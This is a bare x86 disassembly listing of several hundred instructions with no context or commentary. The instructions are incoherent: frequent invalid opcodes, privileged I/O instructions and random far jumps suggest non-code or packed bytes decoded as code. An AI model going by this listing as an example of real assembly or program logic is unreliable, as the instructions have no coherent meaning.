  41fdbc:	xor    eax,0x6124d3fc
  41fdc1:	div    dl
  41fdc3:	mov    DWORD PTR ss:[eax-0x3c727259],esi
  41fdca:	nop
  41fdcb:	dec    esp
  41fdcc:	sub    eax,0x110e536
  41fdd1:	mov    cl,0x3f
  41fdd3:	jns    0x41fd77
  41fdd5:	dec    edi
  41fdd6:	lds    esp,FWORD PTR [edi-0x19]
  41fdd9:	jne    0x41fe2d
  41fddb:	dec    esi
  41fddc:	cmp    DWORD PTR ds:0x8e8c973b,esp
  41fde2:	inc    ebx
  41fde3:	scas   eax,DWORD PTR es:[edi]
  41fde4:	or     bh,BYTE PTR [edi-0x66b2ea4]
  41fdea:	push   esi
  41fdeb:	rcr    DWORD PTR [ebx+ebp*8-0x2f],0xe8
  41fdf0:	(bad)  
  41fdf1:	lods   al,BYTE PTR ds:[esi]
  41fdf2:	push   esp
  41fdf3:	std    
  41fdf4:	add    BYTE PTR [ecx],cl
  41fdf6:	rcl    BYTE PTR [edx-0x3e],cl
  41fdf9:	and    eax,0x22880d10
  41fdfe:	(bad)
  41fe03:	lods   al,BYTE PTR ds:[esi]
  41fe04:	sub    BYTE PTR [ecx],0xb8
  41fe07:	fdivrp st(5),st
  41fe09:	mov    bl,0x8b
  41fe0b:	lds    esi,FWORD PTR [esi]
  41fe0d:	sub    BYTE PTR [ecx-0x70],dh
  41fe10:	sub    edx,DWORD PTR [esi+0x5dde6877]
  41fe16:	and    BYTE PTR gs:[ecx+edi*8+0x1d8395d],dl
  41fe1e:	imul   DWORD PTR [ebx]
  41fe20:	enter  0x9367,0x95
  41fe24:	rol    DWORD PTR [ecx],1
  41fe26:	retf   
  41fe27:	pop    ecx
  41fe28:	ja     0x41fdb6
  41fe2a:	xchg   esp,eax
  41fe2b:	(bad)  [edx]
  41fe2d:	mov    eax,0x6804f833
  41fe32:	adc    al,0xce
  41fe34:	shr    BYTE PTR [ebp+0x2f],1
  41fe37:	inc    ebp
  41fe38:	add    DWORD PTR [ebx+ebx*1+0x7f],edi
  41fe3c:	mov    esi,0x465b9b44
  41fe41:	pop    esi
  41fe42:	xor    eax,0x1136fc48
  41fe47:	or     BYTE PTR ds:0xb3259857,0x48
  41fe4e:	mov    al,0x9a
  41fe50:	pushf  
  41fe51:	dec    edx
  41fe52:	mov    esi,0x44e0c405
  41fe57:	jo     0x41fe10
  41fe59:	fstp   QWORD PTR [ebx+0x69]
  41fe5c:	std    
  41fe5d:	frstor [esp+ecx*2+0x53]
  41fe61:	jmp    0xca20:0x70a02902
  41fe68:	pop    es
  41fe69:	icebp  
  41fe6a:	xchg   edx,eax
  41fe6b:	xchg   BYTE PTR [ecx+0x0],dl
  41fe6e:	(bad)  
  41fe70:	ins    BYTE PTR es:[edi],dx
  41fe71:	lods   eax,DWORD PTR ds:[esi]
  41fe72:	fst    DWORD PTR [edi+0x491efb29]
  41fe78:	pop    edi
  41fe79:	xchg   edx,eax
  41fe7a:	mov    al,ds:0xf413dce1
  41fe7f:	outs   dx,DWORD PTR ds:[esi]
  41fe80:	cmp    eax,0x16d3ad4
  41fe85:	daa    
  41fe86:	cli    
  41fe87:	xor    al,0xa
  41fe89:	bound  ebx,QWORD PTR [edi]
  41fe8b:	add    ch,bl
  41fe8d:	or     DWORD PTR [esi+0x240c4253],0xa4d156f
  41fe97:	lods   al,BYTE PTR ds:[esi]
  41fe98:	icebp  
  41fe99:	rcr    esi,0xad
  41fe9c:	test   BYTE PTR [ecx+0x51370cb8],bl
  41fea2:	lds    esi,FWORD PTR [eax+0x21]
  41fea5:	xchg   esp,eax
  41fea6:	and    eax,0xbf72fc56
  41feab:	push   edx
  41feac:	xchg   ebp,eax
  41fead:	mov    edx,0xafb7ace1
  41feb2:	rcr    DWORD PTR [edx],0x3
  41feb5:	jmp    DWORD PTR [edi+0x668ebecf]
  41febb:	cld    
  41febc:	inc    edi
  41febd:	inc    ecx
  41febe:	sbb    al,0x57
  41fec0:	mov    ch,0x80
  41fec2:	addr16 jnp 0x41fe58
  41fec5:	mov    dh,0x7
  41fec7:	ins    BYTE PTR es:[edi],dx
  41fec8:	loop   0x41fe6b
  41feca:	pop    ecx
  41fecb:	dec    ebp
  41fecc:	js     0x41fe4f
  41fece:	push   0xffffff85
  41fed0:	add    ah,BYTE PTR [esi]
  41fed2:	mov    esp,0x9f2c704b
  41fed7:	frstor [esi+esi*4+0x7792fcc3]
  41fede:	sbb    al,0xea
  41fee0:	jecxz  0x41ff39
  41fee2:	std    
  41fee3:	popf   
  41fee4:	xchg   esi,eax
  41fee5:	and    DWORD PTR [ebp-0x49],esi
  41fee8:	pop    esp
  41fee9:	(bad)  
  41feea:	frstor ds:0x293fce52
  41fef0:	fs jle 0x41ff19
  41fef3:	popf   
  41fef4:	cdq    
  41fef5:	jp     0x41ff4a
  41fef7:	adc    al,0xef
  41fef9:	loope  0x41fe92
  41fefb:	(bad)  
  41fefc:	dec    esp
  41fefd:	push   ebx
  41fefe:	push   edx
  41feff:	stc    
  41ff00:	retf   0x6b7c
  41ff03:	pop    esp
  41ff04:	push   ebx
  41ff05:	jecxz  0x41ff4d
  41ff07:	pop    esp
  41ff08:	das    
  41ff09:	mov    al,ds:0x6e5f4892
  41ff0e:	mov    DWORD PTR [ebx-0x209ad825],0xa6c4e43f
  41ff18:	pop    ds
  41ff19:	sub    al,0x38
  41ff1b:	xchg   ebx,eax
  41ff1c:	push   eax
  41ff1d:	fsubr  st(5),st
  41ff1f:	add    DWORD PTR [edi+0x38],edx
  41ff22:	sbb    eax,0x603b2c11
  41ff27:	mov    dh,0x42
  41ff29:	icebp  
  41ff2a:	mov    esp,0x65870721
  41ff2f:	sbb    al,0x86
  41ff31:	add    al,0x6a
  41ff33:	stos   DWORD PTR es:[edi],eax
  41ff34:	dec    ebp
  41ff35:	gs inc edx
  41ff37:	mov    al,ds:0x930e2437
  41ff3c:	push   edi
  41ff3d:	gs out 0xa6,eax
  41ff40:	xor    DWORD PTR [edx],edx
  41ff42:	lea    eax,[edx+ebp*1]
  41ff45:	adc    BYTE PTR [ebp+0x2c],bl
  41ff48:	es xchg ebx,eax
  41ff4a:	pop    eax
  41ff4b:	mov    ds:0x5431f217,eax
  41ff50:	hlt    
  41ff51:	cmc    
  41ff52:	push   edx
  41ff53:	stc    
  41ff54:	pop    ebp
  41ff55:	test   eax,0xf7fa1a5f
  41ff5a:	dec    ebx
  41ff5b:	pop    ebp
  41ff5c:	retf   
  41ff5d:	xchg   esp,eax
  41ff5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff5f:	lea    edi,[esi+0x430b960]
  41ff65:	mov    bl,0x42
  41ff67:	add    al,0x44
  41ff69:	or     al,0x9e
  41ff6b:	mov    al,ds:0x9edc98e7
  41ff70:	sub    eax,0x692271d1
  41ff75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff76:	nop
  41ff77:	xor    dl,BYTE PTR [eax+eiz*2-0x2c9882f6]
  41ff7e:	leave  
  41ff7f:	adc    ecx,edi
  41ff81:	mov    WORD PTR [edi+ebp*1+0x51bc4611],fs
  41ff88:	push   ebp
  41ff89:	pop    edi
  41ff8a:	es add al,0xbd
  41ff8d:	mov    edi,0x64af339e
  41ff92:	dec    edi
  41ff93:	into   
  41ff94:	mov    dh,ah
  41ff96:	xchg   esi,eax
  41ff97:	ja     0x41ffaf
  41ff99:	push   ebp
  41ff9a:	or     ebx,esp
  41ff9c:	dec    edi
  41ff9d:	mov    eax,ds:0x56082085
  41ffa2:	push   edi
  41ffa3:	mov    bh,0xe7
  41ffa5:	(bad)  
  41ffa6:	aas    
  41ffa7:	jmp    0x7e51fd18
  41ffac:	sbb    eax,0xaa10761e
  41ffb1:	scas   al,BYTE PTR es:[edi]
  41ffb2:	cmp    BYTE PTR [ecx],dh
  41ffb4:	sub    eax,0xa0cf0301
  41ffb9:	push   eax
  41ffba:	xlat   BYTE PTR ds:[ebx]
  41ffbb:	mov    ecx,0x852cbc1f
  41ffc0:	inc    ecx
  41ffc1:	in     al,0x5f
  41ffc3:	imul   edx,DWORD PTR [edx+0x5],0x37
  41ffc7:	mov    ch,0xc6
  41ffc9:	mov    ah,0x60
  41ffcb:	lock test BYTE PTR [esp+edx*1],cl
  41ffcf:	jl     0x420045
  41ffd1:	stos   BYTE PTR es:[edi],al
  41ffd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffd3:	adc    BYTE PTR [ebx+0xde7ca72],0x56
  41ffda:	inc    ecx
  41ffdb:	cmp    al,0x62
  41ffdd:	pop    eax
  41ffde:	imul   ebx,DWORD PTR [edi+ecx*1+0x32],0x2c
  41ffe3:	mov    ds:0x30f4898f,eax
  41ffe8:	inc    ebx
  41ffe9:	imul   ebx
  41ffeb:	iret   
  41ffec:	icebp  
  41ffed:	sub    esi,edi
  41ffef:	sbb    ebp,eax
  41fff1:	cli    
  41fff2:	push   0x51236ee
  41fff7:	rcl    BYTE PTR [eax],1
  41fff9:	ds mov eax,0x3b3cc6de
  41ffff:	mov    ?,ebp
  420001:	mov    bl,0x78
  420003:	pop    esi
  420004:	in     eax,dx
  420005:	fisubr WORD PTR [eax+0x21327707]
  42000b:	fidiv  WORD PTR [edi+0x1468ca44]
  420011:	mov    esp,db2
  420014:	in     eax,dx
  420015:	push   esp
  420016:	mov    ch,0xc0
  420018:	pop    es
  420019:	jo     0x420017
  42001b:	and    al,0xba
  42001d:	mov    cl,0x34
  42001f:	shl    DWORD PTR [edx],0xbf
  420022:	xchg   ah,dh
  420024:	push   0xcdf58e5
  420029:	dec    esi
  42002a:	mov    ?,WORD PTR [eax-0x26bc4dfe]
  420030:	push   ebp
  420031:	mov    ebp,DWORD PTR [esi-0x4b]
  420034:	push   ebp
  420035:	adc    BYTE PTR [ecx+edx*2],0x3b
  420039:	nop
  42003a:	fs mov ah,0x7b
  42003d:	xor    ah,ch
  42003f:	sbb    eax,0xc1d971ec
  420044:	es sbb al,0x2d
  420047:	cmp    dl,0x19
  42004a:	mov    ds,WORD PTR [ebx]
  42004c:	stos   DWORD PTR es:[edi],eax
  42004d:	out    dx,al
  42004e:	xrelease mov BYTE PTR [esp+eax*1],ah
  420052:	mov    esp,0x585cdc3a
  420057:	mov    ds:0x8f4ea419,al
  42005c:	lea    eax,[edx+0x6e4533c9]
  420062:	jne    0x41ffeb
  420064:	(bad)  
  420065:	aaa    
  420066:	cmp    eax,DWORD PTR [edi-0x12f0d28d]
  42006c:	imul   edi,DWORD PTR ds:0x30cd598a,0x67d8e8d
  420076:	(bad)  
  420078:	sub    bh,cl
  42007a:	push   ebx
  42007b:	xchg   ebx,eax
  42007c:	or     eax,0x399b49
  420081:	out    0x0,al
  420083:	adc    edx,esi
  420085:	ss icebp 
  420087:	or     esi,ecx
  420089:	ss inc ebp
  42008b:	inc    ebp
  42008c:	and    ah,BYTE PTR [edi]
  42008e:	repnz mov ebp,0x1f94a819
  420094:	and    al,0xe0
  420096:	jecxz  0x4200b9
  420098:	jecxz  0x420080
  42009a:	out    0x29,al
  42009c:	inc    esp
  42009d:	mov    al,ds:0xa7a3973d
  4200a3:	sub    eax,0x3b562bd8
  4200a8:	dec    edi
  4200a9:	xchg   esp,eax
  4200aa:	call   0x30f7:0xe1ae3cb2
  4200b1:	or     esi,DWORD PTR [esi]
  4200b3:	xchg   ecx,eax
  4200b4:	push   es
  4200b5:	mov    ecx,0xa78b8ce1
  4200ba:	outs   dx,BYTE PTR ds:[esi]
  4200bb:	sub    dl,BYTE PTR [ecx]
  4200bd:	aam    0xad
  4200bf:	std    
  4200c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200c1:	push   esi
  4200c2:	(bad)  
  4200c3:	rcr    BYTE PTR [esi],cl
  4200c5:	rcl    DWORD PTR [ecx-0x4],cl
  4200c8:	xchg   ecx,eax
  4200c9:	hlt    
  4200ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200cb:	outs   dx,DWORD PTR ds:[esi]
  4200cc:	inc    esp
  4200cd:	dec    edx
  4200ce:	or     ebx,edi
  4200d0:	sub    DWORD PTR [ecx+0x55d3054d],eax
  4200d6:	push   es
  4200d7:	mov    edx,gs
  4200d9:	mov    esp,0x4ead6bde
  4200de:	out    dx,al
  4200df:	jns    0x420117
  4200e1:	ds out dx,eax
  4200e3:	lods   al,BYTE PTR ds:[esi]
  4200e4:	sbb    eax,0x5647ef62
  4200e9:	das    
  4200ea:	mov    dl,BYTE PTR [edi]
  4200ec:	shl    BYTE PTR [ebp+0xa],cl
  4200ef:	std    
  4200f0:	imul   esp,DWORD PTR [ebx-0x7],0xad54f819
  4200f7:	mov    eax,ds:0x8dee1434
  4200fc:	sti    
  4200fd:	aad    0x7b
  4200ff:	out    dx,al
  420100:	adc    DWORD PTR [eax+ebx*8+0x70bcd9b8],edx
  420107:	adc    BYTE PTR [eax+0x565379af],cl
  42010d:	push   edx
  42010e:	sub    edx,DWORD PTR ss:[esi-0x649f270d]
  420115:	sbb    al,0x1d
  420117:	out    dx,eax
  420118:	inc    eax
  420119:	mov    ds,WORD PTR [edi-0x43]
  42011c:	icebp  
  42011d:	push   edi
  42011e:	ret    0xe35
  420121:	ss jge 0x420107
  420124:	(bad)  
  420125:	out    0xe7,al
  420127:	in     eax,dx
  420128:	repz pushf 
  42012a:	add    eax,0x25587138
  42012f:	hlt    
  420130:	scas   eax,DWORD PTR es:[edi]
  420131:	push   ss
  420132:	or     BYTE PTR [edi],0xde
  420135:	jg     0x42016b
  420137:	adc    ch,BYTE PTR [edi+0x2f81dabc]
  42013d:	in     al,0xf1
  42013f:	(bad)  
  420141:	ret    0x86ad
  420144:	sbb    al,0xe
  420146:	cmp    dh,bh
  420148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420149:	out    0xc3,eax
  42014b:	and    al,0x2c
  42014d:	sahf   
  42014e:	mov    bh,0x36
  420150:	fbstp  TBYTE PTR [edi+ebp*8]
  420153:	or     eax,0x8f86f096
  420158:	xor    ecx,DWORD PTR [edx-0x24]
  42015b:	sub    cl,ch
  42015d:	ins    BYTE PTR es:[edi],dx
  42015e:	iret   
  42015f:	les    ecx,FWORD PTR [ebp+0x4a]
  420162:	int3   
  420163:	mov    es,WORD PTR [ebx]
  420165:	pop    ss
  420166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420167:	fld    QWORD PTR [ecx-0x4c]
  42016a:	xchg   DWORD PTR ds:0x5d8c48d9,edi
  420170:	aas    
  420171:	add    al,BYTE PTR [eax]
  420173:	add    eax,edx
  420175:	pop    edi
  420176:	js     0x420144
  420178:	fs stos BYTE PTR es:[edi],al
  42017a:	sub    eax,0x1bb96b6d
  42017f:	sahf   
  420180:	cld    
  420181:	push   ds
  420182:	mov    ss,WORD PTR fs:[ecx-0x30903d88]
  420189:	js     0x4201b7
  42018b:	ret    0xafba
  42018e:	bound  edi,QWORD PTR [ecx-0x42]
  420191:	into   
  420192:	jne    0x4201f3
  420194:	mov    eax,ds:0x395d1669
  420199:	xchg   BYTE PTR [ebp+0x625ad4fa],dl
  42019f:	cmp    eax,0x27c3b552
  4201a4:	ds push 0x9694f55
  4201aa:	pop    eax
  4201ab:	add    BYTE PTR [esi+ecx*2+0x5d507d1f],dh
  4201b2:	jecxz  0x4201dc
  4201b4:	push   ds
  4201b5:	loope  0x4201bb
  4201b7:	lock xor edx,edx
  4201ba:	rol    bl,1
  4201bc:	sti    
  4201bd:	iret   
  4201be:	cmp    DWORD PTR [eax+0x40a8b1d6],eax
  4201c4:	xchg   ebx,eax
  4201c5:	pop    ebx
  4201c6:	xchg   BYTE PTR [esp+ebp*4],al
  4201c9:	sub    eax,0x89c21a31
  4201ce:	lods   al,BYTE PTR ds:[esi]
  4201cf:	ins    DWORD PTR es:[edi],dx
  4201d0:	xchg   edx,eax
  4201d1:	or     al,0x3c
  4201d3:	dec    eax
  4201d4:	aaa    
  4201d5:	sub    ecx,DWORD PTR [ebp+0x14]
  4201d8:	scas   eax,DWORD PTR es:[edi]
  4201d9:	add    al,0xc9
  4201db:	pop    ds
  4201dc:	jmp    FWORD PTR [ecx+0x791fb961]
  4201e2:	adc    ah,ah
  4201e4:	cwde   
  4201e5:	or     eax,0x5b8b2469
  4201ea:	fwait
  4201eb:	pop    ss
  4201ec:	(bad)  [esi-0x7d388cd3]
  4201f2:	mov    bh,0x27
  4201f4:	daa    
  4201f5:	lods   eax,DWORD PTR ds:[esi]
  4201f6:	mov    WORD PTR [esi],?
  4201f8:	dec    edi
  4201f9:	sbb    eax,0xef64ca26
  4201fe:	call   0x2659:0x1f687c69
  420205:	call   0xfe63:0x2a024f2b
  42020c:	je     0x4201c2
  42020e:	jp     0x420215
  420210:	adc    eax,0x8c2f1293
  420215:	mov    ebx,0xedbeda3e
  42021a:	sbb    cl,cl
  42021c:	jl     0x42023a
  42021e:	add    BYTE PTR [edi-0x3f27239d],al
  420224:	mov    dl,0xf7
  420226:	jp     0x4201e7
  420228:	jo     0x420237
  42022a:	test   DWORD PTR [ecx+0xd],ebx
  42022d:	pop    ds
  42022e:	retf   0x896
  420231:	xor    al,0xf2
  420233:	add    esi,edi
  420235:	out    dx,al
  420236:	ficom  WORD PTR [ecx+0x6c33906c]
  42023c:	sub    eax,0xfb44637d
  420241:	mov    DWORD PTR [ebp+0x59e672c5],eax
  420247:	pop    es
  420248:	shl    BYTE PTR [ecx-0x7e749ad8],0x66
  42024f:	sbb    DWORD PTR [eax+0xbc827a6],0x4db963ed
  420259:	pop    es
  42025a:	mov    DWORD PTR [ecx+0x5],edi
  42025d:	or     cl,BYTE PTR [edi-0x44d4c526]
  420263:	arpl   WORD PTR [ecx+edi*4-0x73],di
  420267:	arpl   WORD PTR [eax+0x68530f57],dx
  42026d:	add    eax,0xcfa468de
  420272:	test   al,0xe5
  420274:	mov    ah,0xec
  420276:	addr16 mov dl,0x2e
  420279:	or     eax,0x1122415c
  42027e:	jle    0xcac7ac0b
  420284:	rcl    esp,1
  420286:	sbb    BYTE PTR ds:0x469d1133,0xd1
  42028d:	inc    edx
  42028e:	lea    esi,[esi]
  420290:	mov    eax,ds:0x89c8e04a
  420295:	arpl   WORD PTR ds:0xcec8834d,ax
  42029b:	pop    ecx
  42029c:	seto   BYTE PTR [eax]
  42029f:	add    eax,DWORD PTR [edi-0x7b05d971]
  4202a5:	push   0x61b24945
  4202aa:	jne    0x420322
  4202ac:	pop    eax
  4202ad:	mov    bl,0xe0
  4202af:	xchg   DWORD PTR [esi+0x2f],esp
  4202b2:	test   BYTE PTR [ebp-0x26bff26c],cl
  4202b8:	xor    DWORD PTR [edx-0x1854f3a3],0xa0e686b2
  4202c2:	sub    BYTE PTR [eax-0x63],cl
  4202c5:	fwait
  4202c6:	push   ds
  4202c7:	mov    WORD PTR [edi+0x62fa2377],fs
  4202cd:	mov    DWORD PTR [ecx+0x76beee7],eax
  4202d3:	fst    QWORD PTR [edi+esi*4]
  4202d6:	cli    
  4202d7:	js     0x4202cb
  4202d9:	jg     0x4202da
  4202db:	cmc    
  4202dc:	lods   al,BYTE PTR ds:[esi]
  4202dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202de:	sbb    BYTE PTR [edi],ah
  4202e0:	nop
  4202e1:	gs push ebx
  4202e3:	mov    ch,0x42
  4202e5:	mov    eax,0x41bf91a2
  4202ea:	aaa    
  4202eb:	call   0xf95e099c
  4202f0:	jmp    0x62abb93b
  4202f5:	xchg   esi,eax
  4202f6:	push   cs
  4202f7:	ds mov bh,cl
  4202fa:	mov    ?,WORD PTR [ecx]
  4202fc:	sti    
  4202fd:	test   BYTE PTR [ecx],al
  4202ff:	fidivr WORD PTR [ebp+0x18e5be23]
  420305:	push   cs
  420306:	test   edi,esi
  420308:	pop    esp
  420309:	xor    al,0x8f
  42030b:	pop    esi
  42030c:	fist   WORD PTR [ecx]
  42030e:	xchg   bl,dh
  420310:	xchg   esi,eax
  420311:	ins    DWORD PTR es:[edi],dx
  420312:	popa   
  420313:	mov    bh,0x4a
  420315:	sar    dh,0xb
  420318:	pop    es
  420319:	in     eax,dx
  42031a:	(bad)  
  42031b:	arpl   dx,bx
  42031d:	cdq    
  42031e:	push   ecx
  42031f:	jbe    0x420318
  420321:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420322:	xor    DWORD PTR [eax],ebp
  420324:	mov    ch,0xfd
  420326:	push   0x93ab9866
  42032b:	call   edx
  42032d:	gs cli 
  42032f:	pop    edx
  420330:	sbb    BYTE PTR [ecx],al
  420332:	mov    eax,ds:0x3dab4321
  420337:	not    DWORD PTR [esi-0x2a]
  42033a:	out    0xdb,al
  42033c:	and    al,BYTE PTR [eax]
  42033e:	lods   eax,DWORD PTR ds:[esi]
  42033f:	jl     0x420391
  420341:	push   cs
  420342:	fsincos 
  420344:	addr16 fucom st(1)
  420347:	push   DWORD PTR [eax-0x6b073922]
  42034d:	sub    dh,BYTE PTR [ecx-0x7e589f9f]
  420353:	test   DWORD PTR [edi],esp
  420355:	xlat   BYTE PTR ds:[ebx]
  420356:	stc    
  420357:	mov    eax,ds:0x42c44519
  42035c:	or     BYTE PTR [edx-0x39576c59],0x96
  420363:	fist   WORD PTR [edx-0x11]
  420366:	mov    dh,0xd0
  420368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420369:	adc    al,0x37
  42036b:	mov    ds:0x81ab5f0b,al
  420370:	or     esi,ebp
  420372:	pop    ebp
  420373:	mov    edx,DWORD PTR [ebx+0x37cd87d3]
  420379:	mov    ds:0x8e76009a,al
  42037e:	or     al,0x44
  420380:	jbe    0x42030c
  420382:	int3   
  420383:	cdq    
  420384:	fisubr WORD PTR [ecx-0x7c]
  420387:	fnstenv [eax]
  420389:	leave  
  42038a:	push   cs
  42038b:	enter  0x11ef,0xf7
  42038f:	xchg   esi,eax
  420390:	lahf   
  420391:	and    al,0x87
  420393:	mov    dh,0xb5
  420395:	push   ebx
  420396:	fistp  DWORD PTR [edx+0x6c16231f]
  42039c:	sbb    al,0x44
  42039e:	aad    0xc6
  4203a0:	lods   eax,DWORD PTR ds:[esi]
  4203a1:	pop    eax
  4203a2:	loop   0x420422
  4203a4:	(bad)  
  4203a5:	aam    0xe3
  4203a7:	mov    ebp,0x7f222039
  4203ac:	adc    DWORD PTR [edi],edx
  4203ae:	stos   BYTE PTR es:[edi],al
  4203af:	mov    ch,0x68
  4203b1:	cmp    BYTE PTR [ecx],al
  4203b3:	cmp    edi,DWORD PTR [edx]
  4203b5:	cld    
  4203b6:	mov    esp,0x1d82d2e4
  4203bb:	jp     0x42035b
  4203bd:	mov    al,0xed
  4203bf:	xor    eax,0x882ab462
  4203c4:	push   0x2d
  4203c6:	ffree  st(5)
  4203c8:	pop    edi
  4203c9:	dec    ebp
  4203ca:	mov    edi,0x8659ed3
  4203cf:	mov    ebx,0x8acb4a87
  4203d4:	sbb    DWORD PTR [ecx+esi*4+0x532486af],edx
  4203db:	push   ss
  4203dc:	jle    0x420419
  4203de:	repnz cld 
  4203e0:	fld    QWORD PTR [esi+ebx*4]
  4203e3:	sbb    eax,0x101becba
  4203e8:	sub    esi,0xdfd8315c
  4203ee:	adc    eax,0xf1829203
  4203f3:	or     al,BYTE PTR [ebp-0x612dec09]
  4203f9:	ficom  WORD PTR [edi+0x2d0699a8]
  4203ff:	cmp    esi,ebp
  420401:	popa   
  420402:	sub    al,BYTE PTR [ebx]
  420404:	pop    edi
  420405:	mov    esi,0xf4c06ca1
  42040a:	out    dx,al
  42040b:	out    dx,eax
  42040c:	into   
  42040d:	ret    0xca50
  420410:	lods   al,BYTE PTR ds:[esi]
  420411:	add    dl,cl
  420413:	dec    ebx
  420414:	popa   
  420415:	sbb    BYTE PTR [ecx-0x4c],ch
  420418:	shl    BYTE PTR [esp+edx*2],1
  42041b:	mov    esi,0x7509df1d
  420420:	fwait
  420421:	and    ebx,DWORD PTR [esp+eax*8+0x4b]
  420425:	mov    ebx,0x699267d2
  42042a:	test   al,0x30
  42042c:	int    0x8e
  42042e:	mov    ds:0xa4e071d7,al
  420433:	or     eax,0x89736e6a
  420438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420439:	shl    BYTE PTR [ecx],0xbe
  42043c:	enter  0xbb66,0xf
  420440:	pop    ebx
  420441:	retf   
  420442:	ds out dx,eax
  420444:	(bad)  
  420445:	sub    esp,esi
  420447:	mul    DWORD PTR [ebx-0x75]
  42044a:	nop
  42044b:	shl    esp,cl
  42044d:	std    
  42044e:	ds sbb eax,0xd6aa2419
  420454:	dec    eax
  420455:	cmp    dh,BYTE PTR [edx-0x71]
  420458:	mov    bl,0x8a
  42045a:	jbe    0x4204b0
  42045c:	mov    eax,ds:0xabb0931
  420461:	fdivr  QWORD PTR [esi-0x50]
  420464:	fucom  st(6)
  420466:	les    ebx,FWORD PTR ds:[eax-0x508bcb53]
  42046d:	inc    eax
  42046e:	dec    esi
  42046f:	mov    cl,0x35
  420471:	mov    WORD PTR [ecx],?
  420473:	inc    edx
  420474:	or     eax,0x9a5f3cfb
  420479:	sub    cl,0x97
  42047c:	outs   dx,BYTE PTR ds:[esi]
  42047d:	cmc    
  42047e:	stos   BYTE PTR es:[edi],al
  42047f:	fimul  WORD PTR [eax-0x7ce5637f]
  420485:	cmp    DWORD PTR [eax],ebx
  420487:	pop    edx
  420488:	leave  
  420489:	cdq    
  42048a:	scas   al,BYTE PTR es:[edi]
  42048b:	push   esp
  42048c:	lahf   
  42048d:	push   esi
  42048e:	push   ss
  42048f:	imul   ebp,DWORD PTR [ebx-0x39dfa080],0xffffffd9
  420496:	xor    bl,BYTE PTR [edx+0x4d]
  420499:	push   0xfffffffe
  42049b:	mov    ebx,0x2aedaf43
  4204a0:	pop    ebp
  4204a1:	sahf   
  4204a2:	cld    
  4204a3:	rol    BYTE PTR [eax-0x11],cl
  4204a6:	adc    bl,al
  4204a8:	lahf   
  4204a9:	xor    edi,DWORD PTR [ebp-0x67]
  4204ac:	push   DWORD PTR [eax+0x52]
  4204af:	cli    
  4204b0:	add    dl,BYTE PTR [ecx-0x55440a38]
  4204b6:	xor    dl,BYTE PTR [ebp+0x6]
  4204b9:	sub    esp,DWORD PTR [ecx+eax*8]
  4204bc:	push   es
  4204bd:	inc    esp
  4204be:	xchg   esi,eax
  4204bf:	cmp    ah,cl
  4204c1:	imul   edi,DWORD PTR [ebp-0x60],0x77b32191
  4204c8:	adc    edx,DWORD PTR [ebx-0x68]
  4204cb:	dec    ebp
  4204cc:	and    eax,0xa6e16013
  4204d1:	sub    eax,0x80a418ff
  4204d6:	xchg   DWORD PTR [ebp-0x58010e5e],ebp
  4204dc:	mov    ebx,0x424fd448
  4204e1:	pop    es
  4204e2:	(bad)  
  4204e3:	fadd   DWORD PTR [eax+0x47]
  4204e6:	mov    WORD PTR ds:0x6b9c32dd,gs
  4204ec:	inc    edi
  4204ed:	div    al
  4204ef:	pop    edx
  4204f0:	mov    edi,0x9ef15814
  4204f5:	adc    dl,dl
  4204f7:	jg     0x420536
  4204f9:	lahf   
  4204fa:	xchg   esi,eax
  4204fb:	into   
  4204fc:	sub    eax,0xe201babd
  420501:	lds    edi,FWORD PTR ds:0x66c4d4b5
  420507:	lods   al,BYTE PTR ds:[esi]
  420508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420509:	fldenv [edx-0x314b1992]
  42050f:	add    eax,0x272e9e60
  420514:	push   edx
  420515:	or     BYTE PTR [edi-0x68374007],dl
  42051b:	sub    BYTE PTR [ebp-0xc2f46e7],dl
  420521:	mov    WORD PTR [esi+0x27911068],gs
  420527:	adc    al,0x45
  420529:	stos   BYTE PTR es:[di],al
  42052b:	cdq    
  42052c:	or     ch,BYTE PTR [edx+0x53ca6875]
  420532:	icebp  
  420533:	push   ecx
  420534:	pushf  
  420535:	inc    edi
  420536:	scas   eax,DWORD PTR es:[edi]
  420537:	or     eax,0x2389fa1a
  42053c:	pusha  
  42053d:	push   esp
  42053e:	xchg   ecx,eax
  42053f:	push   ecx
  420540:	inc    edx
  420541:	outs   dx,BYTE PTR ds:[esi]
  420542:	imul   esp,DWORD PTR [ebp-0x13],0x777ae7a1
  420549:	in     al,0xf7
  42054b:	add    eax,0x228a4363
  420550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420551:	mov    ch,0xa8
  420553:	cli    
  420554:	pop    DWORD PTR ds:0xc4cbd838
  42055a:	repnz mov ?,WORD PTR [edx-0x5a]
  42055e:	inc    esp
  42055f:	xor    DWORD PTR [ebp-0x9f38f67],ecx
  420565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420566:	sbb    DWORD PTR ds:0x2d00777c,0xf9def8aa
  420570:	fdivr  DWORD PTR ds:0x353878da
  420576:	in     al,dx
  420577:	repz hlt 
  420579:	xor    bh,BYTE PTR [ecx+0x24]
  42057c:	aam    0xfd
  42057e:	int    0xdb
  420580:	jno    0x4205d6
  420582:	loope  0x42051a
  420584:	pop    edi
  420585:	xor    edi,DWORD PTR [edi+0x4bbb4f81]
  42058b:	(bad)  
  42058d:	sbb    DWORD PTR [edi],esp
  42058f:	add    eax,0x970e24fc
  420594:	mov    dh,0x69
  420596:	xchg   edx,eax
  420597:	mov    eax,0xcf4563b9
  42059c:	add    BYTE PTR ds:0xf0b01510,0x2f
  4205a3:	ja     0x42052b
  4205a5:	dec    edi
  4205a6:	adc    ecx,DWORD PTR [ebx+0x45ae4f0d]
  4205ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205ad:	test   ecx,0x8ee4e1a4
  4205b3:	push   ebx
  4205b4:	xor    eax,0xad5297df
  4205b9:	out    dx,al
  4205ba:	push   edx
